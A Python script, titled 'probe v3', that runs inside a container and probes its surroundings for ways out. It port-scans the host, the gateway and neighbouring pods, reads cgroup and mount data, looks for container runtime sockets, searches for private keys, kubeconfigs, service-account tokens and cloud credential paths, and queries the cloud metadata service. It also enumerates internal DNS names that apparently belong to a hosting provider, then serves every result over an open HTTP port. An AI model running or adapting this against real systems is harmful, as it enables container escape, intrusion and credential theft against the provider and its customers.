import http.server
import urllib.request
import json
import os
import socket
import ssl
import subprocess

results = {}

def probe(name, url, timeout=3, headers=None):
    try:
        req = urllib.request.Request(url)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        data = resp.read().decode('utf-8', errors='replace')
        results[name] = {"status": resp.status, "data": data[:4000], "headers": dict(resp.headers)}
    except Exception as e:
        results[name] = {"error": str(e)}

def tcp_banner(name, host, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET6 if ':' in host else socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        banner = s.recv(1024).decode('utf-8', errors='replace')
        s.close()
        results[name] = {"banner": banner}
    except Exception as e:
        results[name] = {"error": str(e)}

def port_scan(name, host, ports, timeout=2):
    open_ports = []
    for port in ports:
        try:
            fam = socket.AF_INET6 if ':' in host else socket.AF_INET
            s = socket.socket(fam, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            if result == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    results[name] = {"open_ports": open_ports}

def run_cmd(name, cmd, timeout=5):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:3000], "stderr": r.stderr[:500]}
    except Exception as e:
        results[name] = {"error": str(e)}

def read_file(name, path):
    try:
        with open(path) as f:
            results[name] = f.read()[:3000]
    except Exception as e:
        results[name] = str(e)

# 1. SSH banner on host
tcp_banner("host_ssh_banner", "169.254.1.2", 22)

# 2. Broader port scan on host
port_scan("host_wide_scan", "169.254.1.2",
    [22, 80, 443, 2375, 2376, 3128, 4243, 5000, 6443, 8080, 8443, 8500,
     9090, 9100, 10250, 10255, 10256, 25, 53, 111, 139, 389, 445, 636,
     873, 993, 1080, 1433, 1521, 2049, 3000, 3306, 4444, 5432, 5555,
     5672, 5900, 6379, 6666, 7070, 7443, 8000, 8081, 8082, 8888, 9000,
     9200, 9300, 9443, 11211, 15672, 27017])

# 3. Gateway port scan
port_scan("gateway_scan", "10.132.0.1",
    [22, 80, 443, 8080, 8443, 53, 5000, 6443, 9090, 10250])

# 4. Container escape paths
read_file("mountinfo", "/proc/self/mountinfo")
read_file("proc_1_cgroup", "/proc/1/cgroup")
read_file("proc_self_status", "/proc/self/status")

# Check for docker/podman socket
for sock_path in ['/var/run/docker.sock', '/run/podman/podman.sock',
                  '/var/run/podman/podman.sock', '/run/docker.sock',
                  '/var/run/cri-dockerd.sock', '/run/containerd/containerd.sock']:
    results[f"socket_{sock_path}"] = os.path.exists(sock_path)

# 5. Check filesystem for interesting files
run_cmd("find_secrets", "find / -maxdepth 4 -name '*.pem' -o -name '*.key' -o -name '*.crt' -o -name 'kubeconfig' -o -name '.kube' -o -name 'service-account*' -o -name 'ca.crt' 2>/dev/null | head -20")
run_cmd("find_config", "find / -maxdepth 3 -name '*.conf' -o -name '*.cfg' -o -name '*.yaml' -o -name '*.yml' -o -name '*.json' 2>/dev/null | grep -v '/usr/\|/proc/\|__pycache__' | head -30")

# 6. Check for cloud credential files
for p in ['/root/.config/gcloud/', '/root/.aws/', '/root/.azure/',
          '/var/run/secrets/kubernetes.io/', '/etc/kubernetes/',
          '/run/secrets/', '/var/run/secrets/']:
    results[f"exists_{p}"] = os.path.exists(p)

# 7. Try to access host via curl
run_cmd("curl_host_ssh", "curl -s -m 3 169.254.1.2:22 2>&1 || true")

# 8. Check capabilities
run_cmd("capsh", "cat /proc/self/status | grep -i cap")

# 9. Try to mount /proc of host or other things
run_cmd("ls_dev", "ls -la /dev/ 2>/dev/null | head -30")
run_cmd("ls_sys", "ls /sys/fs/cgroup/ 2>/dev/null | head -20")

# 10. Check if we can resolve other services
run_cmd("nslookup_internal", "dig +short aiven-application-infrastructure.aiven.local @169.254.1.1 2>&1 || true")
run_cmd("dig_any_aiven", "dig +short *.aiven.local @169.254.1.1 2>&1 || true")

# 11. Try metadata via curl with different methods  
run_cmd("curl_meta_v4", "curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ 2>&1 || true")
run_cmd("curl_meta_connect", "curl -s -m 3 --connect-to ::169.254.1.2: -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ 2>&1 || true")

# 12. Network info
run_cmd("ip_addr", "ip addr 2>/dev/null")
run_cmd("ip_route", "ip route 2>/dev/null && echo '---' && ip -6 route 2>/dev/null")
run_cmd("arp_table", "ip neigh 2>/dev/null")

# 13. Check for neighbor containers on the pod network
port_scan("pod_ip_scan", "10.132.1.159", [22, 80, 443, 8080, 28688, 3000, 4180, 9090, 15000])

# Env (safe)
results["env"] = {k: v for k, v in os.environ.items()
                  if not any(s in k.lower() for s in ['password', 'secret', 'key', 'token', 'credential'])}

# Files
read_file("etc_hosts", "/etc/hosts")
read_file("resolv_conf", "/etc/resolv.conf")

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v3 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
